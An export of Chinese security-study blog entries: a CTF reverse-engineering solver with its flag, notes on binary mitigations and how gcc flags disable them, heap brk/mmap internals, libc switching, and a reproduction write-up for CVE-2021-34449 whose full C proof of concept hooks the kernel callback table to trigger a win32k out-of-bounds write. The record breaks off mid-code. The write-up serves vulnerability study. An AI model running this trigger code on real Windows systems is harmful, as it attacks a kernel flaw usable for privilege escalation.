<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">key = b64decode(<span class="string">b&#x27;Qre50rOeWr3CsrJ4ccefvNO8n9hclqDNztdbco6pZ3IwRV5Q&#x27;</span>)</span><br><span class="line">raw_flag_list = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">raw_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = [i <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span>(row == <span class="number">5</span>):</span><br><span class="line">            raw_flag_list[row*<span class="number">6</span>+col] = key[row*<span class="number">6</span>+col]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            raw_flag_list[row*<span class="number">6</span>+col] = key[row*<span class="number">6</span>+col] - \</span><br><span class="line">                raw_flag_list[(row+<span class="number">1</span>)*<span class="number">6</span>+col]</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        raw_flag += chr(raw_flag_list[row*<span class="number">6</span>+col])</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;&#x27;</span>+raw_flag[::<span class="number">-1</span>]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#hgame&#123;PYtH0n^0pcOdE-iS_s0+1nTeresTiNgg89!!&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>checksec相关安全保护</title>
    <url>/2021/05/12/checksec/</url>
    <content><![CDATA[<h4 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h4><p>程序架构信息。</p>
<h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>Relocation Read-Only (RELRO)  此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。<br> Partial RELRO 易受到攻击，例如攻击者可以<strong>将atoi.got修改为system.plt，然后输入/bin/sh\x00获得shell</strong><br> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>

<h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o hello test.c   //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o hello test.c    //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o hello test.c  //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o  hello test.c // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o  hello test.c // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o  hello test.c // 开启NX保护</span><br></pre></td></tr></table></figure>

<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。若开启一般需在攻击时泄露地址信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c  // 默认情况</span><br><span class="line">gcc -fpie -pie -o hello test.c  // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o hello test.c  // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -no-pie -o hello test.c  //手动设置不开启PIE</span><br><span class="line">(还与运行时系统ALSR设置有关）</span><br></pre></td></tr></table></figure>

<p>顺便说下ASLR技术</p>
<p>Linux下的ASLR总共有3个级别，0、1、2</p>
<ul>
<li>0:0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。</li>
<li>1:1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化</li>
<li>2:2是增强的ASLR，增加了堆随机化。</li>
</ul>
<p><code>/proc/sys/kernel/randomize_va_space</code>文件里记录的就是ASLR等级，可以直接用<code>echo * &gt; /proc/sys/kernel/randomize_va_space</code>修改</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>brk和mmap</title>
    <url>/2021/05/10/brkandmmap/</url>
    <content><![CDATA[<p>Linux 提供了两种堆空间分配的方式，一个是 <code>brk()</code> 系统调用，另一个是 <code>mmap()</code> 系统调用。可以使用 <code>man brk</code>、<code>man mmap</code> 查看。</p>
<h2 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h2><p><code>brk()</code> 的声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure>

<p>参数 <code>*addr</code> 是进程数据段的结束地址，<code>brk()</code> 通过改变该地址来改变数据段的大小，当结束地址向高地址移动，进程内存空间增大，当结束地址向低地址移动，进程内存空间减小。<code>brk()</code>调用成功时返回 0，失败时返回 -1。 <code>sbrk()</code> 与 <code>brk()</code> 类似，但是参数 <code>increment</code> 表示增量，即增加或减少的空间大小，调用成功时返回增加或减小前数据段的结束地址，失败时返回 -1。</p>
<p>在上图中我们看到 brk 指示堆结束地址，start_brk 指示堆开始地址。BSS segment 和 heap 之间有一段 Random brk offset，这是由于 ASLR 的作用，如果关闭了 ASLR，则 Random brk offset 为 0，堆结束地址和数据段开始地址重合。</p>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk, *pre_brk;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;当前进程 PID：%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;初始化后的结束地址：%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;brk 之后的结束地址：%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        pre_brk = sbrk(<span class="number">4096</span>);</span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sbrk 返回值（即之前的结束地址）：%p\n&quot;</span>, pre_brk);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sbrk 之后的结束地址：%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;恢复到初始化时的结束地址：%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p><code>mmap()</code> 的声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> fildes, <span class="keyword">off_t</span> off)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>mmap()</code> 函数用于创建新的虚拟内存区域，并将对象映射到这些区域中，当它不将地址空间映射到某个文件时，我们称这块空间为匿名（Anonymous）空间，匿名空间可以用来作为堆空间。<code>mmap()</code> 函数要求内核创建一个从地址 <code>addr</code> 开始的新虚拟内存区域，并将文件描述符 <code>fildes</code> 指定的对象的一个连续的片（chunk）映射到这个新区域。连续的对象片大小为 <code>len</code> 字节，从距文件开始处偏移量为 <code>off</code> 字节的地方开始。<code>prot</code> 描述虚拟内存区域的访问权限位，<code>flags</code> 描述被映射对象类型的位组成。</p>
<p><code>munmap()</code> 则用于删除虚拟内存区域：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">munmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *curr_brk;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当前进程 PID：%d\n&quot;</span>, getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化后\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *addr;</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">4096</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmap 完成\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    munmap(addr, (<span class="keyword">size_t</span>)<span class="number">4096</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;munmap 完成\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常情况下，我们不会直接使用 <code>brk()</code> 和 <code>mmap()</code> 来分配堆空间，C 标准库提供了一个叫做 <code>malloc</code> 的分配器，程序通过调用 <code>malloc()</code> 函数来从堆中分配块，声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">calloc</span><span class="params">(<span class="keyword">size_t</span> nmemb, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="决定使用两个函数中哪一个的条件"><a href="#决定使用两个函数中哪一个的条件" class="headerlink" title="决定使用两个函数中哪一个的条件"></a>决定使用两个函数中哪一个的条件</h2><p><code>sysmalloc</code>中有这样一个判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br></pre></td></tr></table></figure>

<p>满足条件则使用<code>mmap</code>，否则使用<code>brk</code>，关键在于申请的 size 是否大于<code>mmap_threshold</code>，对这个值的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span><br><span class="line">#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN</span><br><span class="line">  .mmap_threshold &#x3D; DEFAULT_MMAP_THRESHOLD,</span><br></pre></td></tr></table></figure>

<p>size 大于<code>128*1024</code>Bytes 则使用 mmap。</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>关于切换libc版本</title>
    <url>/2021/05/12/chlibc/</url>
    <content><![CDATA[<h1 id="修改LD-PRELOAD"><a href="#修改LD-PRELOAD" class="headerlink" title="修改LD_PRELOAD"></a>修改LD_PRELOAD</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=<span class="string">&quot;./libc.so.6&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p =  process([<span class="string">&quot;file_name&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>通过修改<code>LD_PRELOAD</code>可以使程序加载指定的libc，一般用于加载题目提供的libc，但这种状况是没有debug symbol的。</p>
<h1 id="glibc-all-in-one-patchelf"><a href="#glibc-all-in-one-patchelf" class="headerlink" title="glibc-all-in-one+patchelf"></a>glibc-all-in-one+patchelf</h1><p>调试程序时不需要加载目标libc只需要某特定版本可用这个组合，带有debug symbol。</p>
<p>自动化下载libc：</p>
<p><a href="https://github.com/matrix1001/glibc-all-in-one">glibc-all-in-one</a></p>
<p>下载想要的libc版本后用patchelf修改文件硬编码中的libc和ld路径</p>
<p>安装patchelf：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install patchelf</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so elffile</span><br><span class="line">patchelf --replace-needed libc.so.6 ~/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so elffile</span><br></pre></td></tr></table></figure>

<p>简化sh脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="built_in">set</span> -u</span><br><span class="line">libc_path=<span class="variable">$1</span></span><br><span class="line">elf_path=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    patchelf --<span class="built_in">set</span>-interpreter <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    patchelf --replace-needed libc.so.6 <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +e</span><br><span class="line"><span class="built_in">set</span> +u</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-34449</title>
    <url>/2021/09/27/CVE-2021-34449/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><p>win32kfull中一个类型混淆引发的越界写</p>
<ul>
<li>漏洞编号：CVE-2021-34449</li>
<li>漏洞类型：越界写</li>
<li>漏洞影响：本地提权</li>
</ul>
<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>win32k 是一个负责管理窗口管理器（User）和图形设备接口（GDI）的内核模式驱动程序。</p>
<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><p>没有分析到利用的部分。</p>
<h3 id="4-漏洞影响"><a href="#4-漏洞影响" class="headerlink" title="4. 漏洞影响"></a>4. 漏洞影响</h3><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34449">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34449</a></p>
<h3 id="5-解决方案"><a href="#5-解决方案" class="headerlink" title="5. 解决方案"></a>5. 解决方案</h3><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34449">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34449</a></p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>win10 1909 64位，更新到修复漏洞前一个版本</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hqyW9.png"></p>
<h3 id="2-poc执行流程"><a href="#2-poc执行流程" class="headerlink" title="2. poc执行流程"></a>2. poc执行流程</h3><p>完整poc</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hWin32u = GetModuleHandleA(<span class="string">&quot;win32u.dll&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ULONG_PTR</span><span class="params">(__fastcall* fnNtUserConsoleControl)</span><span class="params">(ULONG_PTR, PVOID, ULONG_PTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ULONG_PTR</span><span class="params">(__fastcall* fnNtUserSetWindowFNID)</span><span class="params">(HWND, ULONG_PTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(APIENTRY* NtUserCallHwndParamPtr)</span><span class="params">(HWND hWnd, DWORD value, DWORD func)</span></span>;</span><br><span class="line">NtUserCallHwndParamPtr NtUserCallHwndParam = <span class="literal">NULL</span>;</span><br><span class="line">fnNtUserConsoleControl pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(hWin32u, <span class="string">&quot;NtUserConsoleControl&quot;</span>);</span><br><span class="line"></span><br><span class="line">fnNtUserSetWindowFNID pfnNtUserSetWindowFNID = (fnNtUserSetWindowFNID)GetProcAddress(hWin32u, <span class="string">&quot;NtUserSetWindowFNID&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CallSetDialogPointer 0x65</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">xxxClientFreeWindowClassExtraBytesHook</span><span class="params">(PVOID MSG)</span> </span>&#123;</span><br><span class="line">	ULONG64 ulArr[<span class="number">0x20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	ulArr[<span class="number">0</span>] = (ULONG64)g_hWnd;</span><br><span class="line">	<span class="keyword">if</span> ((*(HWND*)*(HWND*)MSG) == g_hWnd) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;qaq&quot;</span>);</span><br><span class="line">		NtUserCallHwndParam(g_hWnd, <span class="number">0x01</span>, CallSetDialogPointer);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">fnDWORDHook</span><span class="params">(PMSG MSG)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Hook_Func</span><span class="params">(VOID)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	BYTE* _teb = (BYTE*)__readgsqword(<span class="number">0x30</span>);</span><br><span class="line">	PVOID* _peb = *(PVOID**)(_teb + <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	PULONG64	CallbackTable = (PULONG64) * (ULONG64*)((ULONG64)_peb + <span class="number">0x58</span>);</span><br><span class="line"></span><br><span class="line">	VirtualProtect(CallbackTable, <span class="number">0x1000</span>, <span class="number">0x40</span>, &amp;OldProtect);</span><br><span class="line"></span><br><span class="line">	*(ULONG64*)((ULONG64)CallbackTable + <span class="number">0x08</span> * <span class="number">0x02</span>) = (ULONG64)fnDWORDHook;</span><br><span class="line"></span><br><span class="line">	*(ULONG64*)((ULONG64)CallbackTable + <span class="number">0x08</span> * <span class="number">0x7C</span>) = (ULONG64)xxxClientFreeWindowClassExtraBytesHook;</span><br><span class="line"></span><br><span class="line">	VirtualProtect(CallbackTable, <span class="number">0x1000</span>, OldProtect, &amp;OldProtect);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	WNDCLASS wc = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	wc.cbWndExtra = <span class="number">0x30</span>;</span><br><span class="line">	wc.lpfnWndProc = DefWindowProc;</span><br><span class="line">	wc.lpszClassName = (LPCWSTR)<span class="number">0xc01f</span>;</span><br><span class="line"></span><br><span class="line">	RegisterClass(&amp;wc);</span><br><span class="line"></span><br><span class="line">	NtUserCallHwndParam = (NtUserCallHwndParamPtr)GetProcAddress(GetModuleHandle(<span class="string">L&quot;win32u&quot;</span>), <span class="string">&quot;NtUserCallHwndParam&quot;</span>);</span><br><span class="line"></span><br><span class="line">	g_hWnd = CreateWindow(wc.lpszClassName, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	SetWindowLongA(g_hWnd, <span class="number">0</span>, (ULONG)g_hWnd);</span><br><span class="line"></span><br><span class="line">	Hook_Func();</span><br><span class="line"></span><br><span class="line">	pfnNtUserSetWindowFNID(g_hWnd, <span class="number">0x2A4</span>);</span><br><span class="line"></span><br><span class="line">	DestroyWindow(g_hWnd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册窗口类，额外内存大小为<code>0x30</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">WNDCLASS wc = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">wc.cbWndExtra = <span class="number">0x30</span>;</span><br><span class="line">wc.lpfnWndProc = DefWindowProc;</span><br><span class="line">wc.lpszClassName = (LPCWSTR)<span class="number">0xc01f</span>;</span><br><span class="line"></span><br><span class="line">RegisterClass(&amp;wc);</span><br></pre></td></tr></table></figure>

<p>获取<code>win32u!NtUserCallHwndParam</code>函数地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NtUserCallHwndParam = (NtUserCallHwndParamPtr)GetProcAddress(GetModuleHandle(<span class="string">L&quot;win32u&quot;</span>), <span class="string">&quot;NtUserCallHwndParam&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>创建窗口，将窗口句柄用<code>SetWindowLongA</code>函数写到额外内存中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_hWnd = CreateWindow(wc.lpszClassName, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">SetWindowLongA(g_hWnd, <span class="number">0</span>, (ULONG)g_hWnd);</span><br></pre></td></tr></table></figure>

<p>​    hook 回调函数表,<code>xxxClientFreeWindowClassExtraBytesHook</code>函数通过调用<code>NtUserCallHwndParam</code>用对应的调用号来调用<code>SetDialogPointer</code>函数，<code>fnDWORD</code>函数则被替换成空函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CallSetDialogPointer 0x65</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">xxxClientFreeWindowClassExtraBytesHook</span><span class="params">(PVOID MSG)</span> </span>&#123;</span><br><span class="line">	ULONG64 ulArr[<span class="number">0x20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	ulArr[<span class="number">0</span>] = (ULONG64)g_hWnd;</span><br><span class="line">	<span class="keyword">if</span> ((*(HWND*)*(HWND*)MSG) == g_hWnd) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;qaq&quot;</span>);</span><br><span class="line">		NtUserCallHwndParam(g_hWnd, <span class="number">0x01</span>, CallSetDialogPointer);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">fnDWORDHook</span><span class="params">(PMSG MSG)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Hook_Func</span><span class="params">(VOID)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	BYTE* _teb = (BYTE*)__readgsqword(<span class="number">0x30</span>);</span><br><span class="line">	PVOID* _peb = *(PVOID**)(_teb + <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	PULONG64	CallbackTable = (PULONG64) * (ULONG64*)((ULONG64)_peb + <span class="number">0x58</span>);</span><br><span class="line"></span><br><span class="line">	VirtualProtect(CallbackTable, <span class="number">0x1000</span>, <span class="number">0x40</span>, 